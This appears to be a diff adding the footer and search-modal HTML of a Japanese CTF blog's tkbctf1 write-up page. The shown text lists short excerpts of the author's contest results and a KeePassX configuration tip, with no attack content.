+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+            
+              
+                <div id="disqus_thread">
+  <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+              
+            
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+      <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/"><img alt="Creative Commons License" style="border-width:0" src="https://i.creativecommons.org/l/by-sa/4.0/80x15.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">ngkz.log</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="https://ngkz.github.io/" property="cc:attributionName" rel="cc:attributionURL">Kazutoshi Noguchi</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-sa/4.0/">Creative Commons Attribution-ShareAlike 4.0 International License</a>.
+  </span>
+</footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="1">
+        
+  <div class="post-actions-wrap">
+      <nav >
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/seccon-2012-finals/" data-tooltip="SECCON CTF 2012 全国大会で優勝しました。">
+              
+                <i class="fa fa-angle-left"></i>
+                <span class="hide-xs hide-sm text-small icon-ml">次</span>
+              </a>
+            </li>
+            <li class="post-action">
+              
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://ngkz.github.io/2014/01/newyearsctf/" data-tooltip="年越しCTF x86-64.jp大会 2014で優勝しました。">
+              
+                <span class="hide-xs hide-sm text-small icon-mr">前</span>
+                <i class="fa fa-angle-right"></i>
+              </a>
+            </li>
+        </ul>
+      </nav>
+    <ul class="post-actions post-action-share" >
+      
+        <li class="post-action hide-lg hide-md hide-sm">
+          <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions">
+            <i class="fa fa-share-alt"></i>
+          </a>
+        </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-facebook-official"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-twitter"></i>
+            </a>
+          </li>
+        
+          <li class="post-action hide-xs">
+            <a class="post-action-btn btn btn--default" target="new" href="https://plus.google.com/share?url=https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+              <i class="fa fa-google-plus"></i>
+            </a>
+          </li>
+        
+      
+      
+        <li class="post-action">
+          <a class="post-action-btn btn btn--default" href="#disqus_thread">
+            <i class="fa fa-comment-o"></i>
+          </a>
+        </li>
+      
+      <li class="post-action">
+        
+          <a class="post-action-btn btn btn--default" href="#">
+        
+          <i class="fa fa-list"></i>
+        </a>
+      </li>
+    </ul>
+  </div>
+
+
+      </div>
+      <div id="share-options-bar" class="share-options-bar" data-behavior="1">
+  <i id="btn-close-shareoptions" class="fa fa-close"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
+          <i class="fa fa-facebook-official"></i><span>Facebookで共有</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
+          <i class="fa fa-twitter"></i><span>Twitterで共有</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://plus.google.com/share?url=https%3A%2F%2Fngkz.github.io%2F2014%2F01%2Ftkbctf1-writeup%2F">
+          <i class="fa fa-google-plus"></i><span>Google&#43;で共有</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-remove"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://ngkz.github.io/mypicture.jpg" alt="著者の絵" />
+    
+    <h4 id="about-card-name">Kazutoshi Noguchi</h4>
+    
+      <div id="about-card-bio">TODO</div>
+    
+    
+    
+      <div id="about-card-location">
+        <i class="fa fa-map-marker"></i>
+        <br/>
+        Japan
+      </div>
+    
+  </div>
+</div>
+
+    <div id="algolia-search-modal" class="modal-container">
+  <div class="modal">
+    <div class="modal-header">
+      <span class="close-button"><i class="fa fa-close"></i></span>
+      <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+        <span class="searchby-algolia-text text-color-light text-small">by</span>
+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="検索" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center"></div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/07/seccon-2014-online-japanese-quals-writeup/">
+                <h3 class="media-heading">SECCON 2014 オンライン予選 (日本語) writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jul 7, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>0x0として参加しました。<br />
+予選2位通過</p>
+
+<p>
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2014-online-japanese-quals-writeup/457b016a7d87f547798e78390869ca63.png" title="問題一覧" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2014-online-japanese-quals-writeup/457b016a7d87f547798e78390869ca63.png"  alt="問題一覧">
+  
+    </a>
+  
+   
+    <span class="caption">問題一覧</span>
+  
+</div>
+<br />
+※上のスクリーンショットを撮った後に@nolzeがPrint it!を解いている</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/03/seccon-2013-finals-writeup/">
+                <h3 class="media-heading">SECCON 二連覇しました。(SECCON 2013 決勝 writeup)</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><h2 id="結果">結果</h2>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2013-finals-writeup/seccon2013-score-mod.jpg" title="スコアの推移" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2013-finals-writeup/seccon2013-score-mod.jpg"  alt="スコアの推移">
+  
+    </a>
+  
+   
+    <span class="caption">スコアの推移</span>
+  
+</div>
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2013-finals-writeup/07a99802f28b64656dd4f4187644d1d8.png" title="問題一覧" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2013-finals-writeup/07a99802f28b64656dd4f4187644d1d8.png"  alt="問題一覧">
+  
+    </a>
+  
+   
+    <span class="caption">問題一覧</span>
+  
+</div>
+
+
+<p>問題一覧の画像とCSSを保存し忘れた。 </p>
+
+<p>チーム0x0としてSECCON 2013 全国大会に参加しました。</p>
+
+<p>今回のメンバーはwasao, waidotto, nolzeと私です。<br />
+4139ptで優勝しました。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/01/seccon-2013-online-quals-writeup/">
+                <h3 class="media-heading">SECCON 2013 オンライン予選 writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>SECCON オンライン予選にチーム0x0のメンバーとして参加しました。</p>
+
+<p>3700点で7位でした。</p>
+
+<p>bin500に時間をかけ過ぎた結果、練習問題とbin200しか解けなかった。</p>
+
+<p>バイナリ問題以外も見ておけばよかった</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2013-online-quals-writeup/90b303d7e1e753a918811d598aa91f83.png" title="スコアの推移" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2013-online-quals-writeup/90b303d7e1e753a918811d598aa91f83.png"  alt="スコアの推移">
+  
+    </a>
+  
+   
+    <span class="caption">スコアの推移</span>
+  
+</div>
+
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/01/30c3ctf-writeup/">
+                <h3 class="media-heading">30c3 ctf writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>2013/12/28-30 の30c3 ctfにチーム0x0として参加しました。</p>
+
+<p><a href="https://archive.aachen.ccc.de/30c3ctf.aachen.ccc.de/scoreboard/">2100点で19位でした。</a></p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/01/seccon-2012-finals/">
+                <h3 class="media-heading">SECCON CTF 2012 全国大会で優勝しました。</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>書きかけのwriteupがあったのでアップロードしておく</p>
+
+<p>2013/2/23 - 2/24の SECCON CTF 全国大会に チーム 0x0として参加しました。</p>
+
+<p>チームメンバーは nash氏、wasao氏、waidotto氏、nullmineral氏と私です。</p>
+
+<p>スコアは 1684ptでした。</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2012-finals/8350e0f576a0bb0ad3cbe70355ba0061.png" title="問題一覧" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2012-finals/8350e0f576a0bb0ad3cbe70355ba0061.png"  alt="問題一覧">
+  
+    </a>
+  
+   
+    <span class="caption">問題一覧</span>
+  
+</div>
+
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/01/tkbctf1-writeup/">
+                <h3 class="media-heading">tkbctf1 writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>2013/5/4〜5/5の<a href="http://tkbctf.info/tkbctf1">tkbctf1</a>に参加しました。</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png" title="Scoreboard" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/fa296654d5c0a34f2c78631fe4577d70.png"  alt="Scoreboard">
+  
+    </a>
+  
+   
+    <span class="caption">Scoreboard</span>
+  
+</div>
+
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png" title="Challenges" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/tkbctf1-writeup/6007d2ae22af0d2db3a312c9ba731253.png"  alt="Challenges">
+  
+    </a>
+  
+   
+    <span class="caption">Challenges</span>
+  
+</div>
+
+
+<p>個人ランキングで1位でした。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2014/01/newyearsctf/">
+                <h3 class="media-heading">年越しCTF x86-64.jp大会 2014で優勝しました。</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Jan 1, 2014
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/newyearsctf/0734e47f8886a005a11bedd17955a0c6.png" title="Scoreboard" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/newyearsctf/0734e47f8886a005a11bedd17955a0c6.png"  alt="Scoreboard">
+  
+    </a>
+  
+   
+    <span class="caption">Scoreboard</span>
+  
+</div>
+
+
+<p>優勝して賞金2500円を手に入れました。</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2013/09/galaxys3-adb-restore-fail/">
+                <h3 class="media-heading">Galaxy S3(SC-06D)がadbバックアップを戻した後再起動を繰り返すようになったときの対処方法</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Sep 9, 2013
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><h2 id="リカバリモードに入ってファクトリーリセットする">リカバリモードに入ってファクトリーリセットする</h2>
+
+<p>galaxy S3 リカバリモードの入り方:</p>
+
+<iframe width="560" height="315" src="https://www.youtube.com/embed/QVa3yfxP0Zs" frameborder="0" allowfullscreen></iframe>
+
+<h2 id="バックアップを展開">バックアップを展開</h2>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2013/03/howto-reactivate-keepassx/">
+                <h3 class="media-heading">トレイに格納したKeePassXを復元できるようにする方法</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Mar 3, 2013
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p>Ubuntu 12.10-14.04で確認済み</p>
+
+<pre><code>echo &quot;keepassx=1&quot; &gt;&gt; /etc/xdg/sni-qt.conf
+</code></pre>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://ngkz.github.io/2012/12/seccon-2012-yokohama-quals-writeup/">
+                <h3 class="media-heading">SECCON CTF 横浜大会 (SECCON 2012 予選) writeup</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2012
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather"><p><a href="http://www.seccon.jp/">SECCON CTF 横浜大会</a>にチーム 0x0として参加しました。<br />
+チームメンバーは nash氏、wasao氏、waidotto氏、nullmineral氏と私です。</p>
+
+<h2 id="成績">成績</h2>
+
+<p>score: たぶん8120</p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2012-yokohama-quals-writeup/514d338eaff15827c0309966508eddbb.png" title="終了数分前の問題一覧" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2012-yokohama-quals-writeup/514d338eaff15827c0309966508eddbb.png"  alt="終了数分前の問題一覧">
+  
+    </a>
+  
+   
+    <span class="caption">終了数分前の問題一覧</span>
+  
+</div>
+
+
+<p></p>
+
+
+
+ 
+  
+  
+  
+  
+    
+  
+
+<div class="figure " >
+  
+    <a class="fancybox" href="https://ngkz.github.io/assets/seccon-2012-yokohama-quals-writeup/seccon-yokohama.jpg" title="賞状 第三位" data-fancybox-group="">
+  
+    <img class="fig-img" src="https://ngkz.github.io/assets/seccon-2012-yokohama-quals-writeup/seccon-yokohama.jpg" style="width: 295px;height: 400px;" alt="賞状 第三位">
+  
+    </a>
+  
+   
+    <span class="caption">賞状 第三位</span>
+  
+</div>
+
+
+<p><br />
+✌(&lsquo;ω&rsquo;)</p>
+
+<p></p></div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero=""
+         data-message-one=""
+         data-message-other="">
+         11 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://ngkz.github.io/images/cover.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js" integrity="sha256-IFHWFEbU2/+wNycDECKgjIRSirRNIDp2acEB5fvdVRU=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.8.0/highlight.min.js" integrity="sha256-+mpyNVJsNt4rVXCw0F+pAOiB3YxmHgrbJsx4ecPuUaI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/jquery.fancybox.min.js" integrity="sha256-vMxgR/7FtLovVA+IPrR7+xTgIgARH7y9VZQnmmi0HDI=" crossorigin="anonymous"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.4/helpers/jquery.fancybox-thumbs.min.js" integrity="sha256-N0qFUh7/9vLvia87dDndewmsgsyYoNkdA212tPc+2NI=" crossorigin="anonymous"></script>
+
+
+<script src="https://ngkz.github.io/js/script-qi9wbxp2ya2j6p7wx1i6tgavftewndznf4v0hy2gvivk1rxgc3lm7njqb6bz.min.js"></script>
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/ngkz.github.io\/2014\/01\/tkbctf1-writeup\/';
+          
+            this.page.identifier = '\/2014\/01\/tkbctf1-writeup\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'ngkz-log';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+    
+  </body>
+</html>
+
